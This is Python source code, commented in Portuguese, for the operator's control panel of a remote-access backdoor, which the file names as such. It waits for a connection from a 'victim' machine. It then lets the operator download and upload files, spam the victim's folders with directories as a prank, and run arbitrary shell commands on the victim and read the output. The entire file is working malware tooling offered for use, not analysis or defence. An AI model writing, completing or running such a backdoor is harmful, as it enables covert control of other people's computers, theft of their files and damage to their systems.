from socket import *
from os import system
from os.path import basename, exists, getsize
from functions import *

INFO_BACKDOOR = {'version': '1.0.0', 'update_data': '28/10/2022'}

AdaptedFromSystem(Windows='cls', Linux='clear')
## Verifica a porta a abrir o backdoor
while True:
    try:
        port = int(input('[PORT] Digite a porta a ser aberta com o backdoor\n>\33[m ').strip())
    except:
        AdaptedFromSystem(Windows='cls', Linux='clear')
        print('\33[7;31m[ERROR] Digite a porta de uma maneira correta. example: 5424\33[m')
        continue
    else:
        AdaptedFromSystem(Windows='cls', Linux='clear')
        if(port < 0 or port > 65536):
            print('\33[7;31m[ERROR] Digite a porta de uma maneira correta. example: 5424\33[m')
            continue
        break

ANDRESS = ('localhost', port)
AdaptedFromSystem(Windows='cls', Linux='clear')

socket = socket(AF_INET, SOCK_STREAM)
socket.bind(ANDRESS)
socket.listen()
print("Aguardando alguma conexão...")

while True:
    try:
        client, andress = socket.accept()
        AdaptedFromSystem(Windows='cls', Linux='clear')
        print(f"\33[7;32m[CONNECTION] Uma conexão foi estabelecida | ANDRESS: {andress[0]}:{andress[1]}\33[m\nUse 'dk_help' para ver os comandos.")
        try:
            while client:
                AdaptedFromSystem(Windows=f'title Painel Backdoor - Vitima ANDRESS: {andress[0]}:{andress[1]}')
                command = input(f'\33[1;34m@command\33[m: ').lower().strip()
                
                ## Fecha conexão com o client atual.
                if(command == 'dk_exit'):
                    client.close()
                    print('\33[7;93m[INFO] A conexão foi fechada com sucesso. Aguardadndo uma nova conexão...\33[m')
                    break
                
                
                ## Limpa o terminal
                elif(command == 'cls'): AdaptedFromSystem(Windows='cls', Linux='clear')


                ## Transfere um arquivo da vitima para o servidor.
                elif(command == 'dk_getfile'):
                    file = input('\33[1;93m[DIR] Digite o diretorio do arquivo para fazer o download.\n>\33[m ').strip()
                    print('\n\33[7;93m[PROGRESS] Fazendo download do arquivo...\33[m')
                    try:
                        data = {'command':'dk_getfile', 'file':file}
                        client.send(bytes(str(data), 'UTF-8'))
                        size = client.recv(1024)
                        download = client.recv(int(size.decode()))
                        with open(basename(file), 'wb') as f:
                            f.write(download)
                    except Exception as ex:
                        print(f'\n\33[7;31m[ERROR] Falha em concluir o download do arquivo.\nDESC: {ex}\33[m')
                    else:
                        print('\n\33[7;32m[SUCESS] Download concluido com sucesso.\33[m')
                    continue
               
               
                ## Transfere um arquivo da maquina para a vitima.
                elif(command == 'dk_sendfile'):
                    try:
                        file_name = input('\33[1;93m[FILE] Digite o diretorio do arquivo para fazer o upload.\n>\33[m ').strip()
                        if(exists(file_name) == False):
                            print('\33[7;31m[ERROR] Arquivo inexistente.\33[m')
                            continue
                        else:
                            
                            dir = input(
                            '\33[1;93m[FILE] Digite o diretorio em que o arquivo sera baixado(aperte enter para o mesmo diretorio do programa)\n>\33[m '
                            ).strip()
                            data = {'command':'dk_sendfile', 'file':dir, 'size':(getsize(file_name)+1024)}
                            client.send(bytes(str(data), 'UTF-8'))
                            with open(file_name, 'rb') as f:
                                client.send(f.read())
                            result = client.recv(512).decode()
                            if(result == 'sucess'):
                                print('\n\33[7;32m[SUCESS] Transferencia concluido com sucesso.\33[m')
                            elif(result == 'dir_not_exists'):
                                print('\n\33[7;31m[ERROR] Falha na transferencia do arquivo. Diretorio nao existente no cumputador da vitima.\33[m')
                            else:
                                print('\n\33[7;31m[ERROR] Falha na transferencia do arquivo.\33[m')
                    except Exception as errorcode:
                        print(f'\n\33[7;31m[ERROR] {errorcode}\33[m')

                ## Cria varios diretorios(troll)
                elif(command == 'dk_spamdir'):
                    dir = input('\33[1;93m[DIR] Digite o diretorio a ser criado as pastas(Escolha corretamente, caso aperte enter ele irá criar na pasta base, exemplo C:\).\n>\33[m ').strip()
                    name_path = input('\33[1;93m[NAME] Digite o nome que as pastas irão receber\n>\33[m ').strip()
                    while True:
                        try:
                            amount = int(input('\33[1;93m[AMOUNT] Digite a quantidade de pastas que serão criadas.\n>\33[m '))
                            if amount <= 0:
                                print('\n\33[7;31m[ERROR] Digite um valor maior que 0.\33[m')
                                continue
                            else:
                                data = {'command':'dk_spamdir', 'dir':dir, 'name_path':name_path, 'amount':amount}
                                client.send(bytes(str(data), 'UTF-8'))
                                print('\n\33[7;93m[PROGRESS] Tentando fazer o spam de diretorios...\33[m')
                                break
                        except:
                            print('\n\33[7;31m[ERROR] Digite um valor numero correto, que não seja menor que 1.\33[m')
                            continue
                    result = client.recv(128).decode('UTF-8')
                    if(result == 'S'):
                        print('\n\33[7;32m[SUCESS] Spam concluido com sucesso.\33[m')
                    else:
                        print(f'\n\33[7;31m[ERROR] Falha em concluir o spam do arquivo.\33[m\nDESC: {result}')


                ## Printa na tela os comandos do backdoor.
                elif(command == 'dk_help'): 
                    ShowDialogHelp()

                ## Checa a versão do backdoor.
                elif(command == 'dk_checkv'):
                    print(f'\n\33[1;31mVersao\33[m: {INFO_BACKDOOR["version"]}\n\33[1;31mUltimo Update\33[m: {INFO_BACKDOOR["update_data"]}\n')


                ## Comando normal do CMD.
                else:
                    data = {'command':command, 'file':''}
                    client.send(bytes(str(data), 'UTF-8'))
                    consult = client.recv(1024 * 3).decode('windows-1252')
                    print(consult)
        except:
            client.close()
    except WindowsError as errorcode:
        if errorcode.winerror == 10054:
            print(f'\n\33[7;33m[CONNECTION] A conexao com a vitima foi perdida, aguardando uma nova conexao...\33[m')
        else:
            print(f'\n\33[7;31m[ERROR] {errorcode}\33[m')
        continue
    except Exception as errorcode:
        print(f'\33[7;31m\n[ERROR] {errorcode}\33[m')

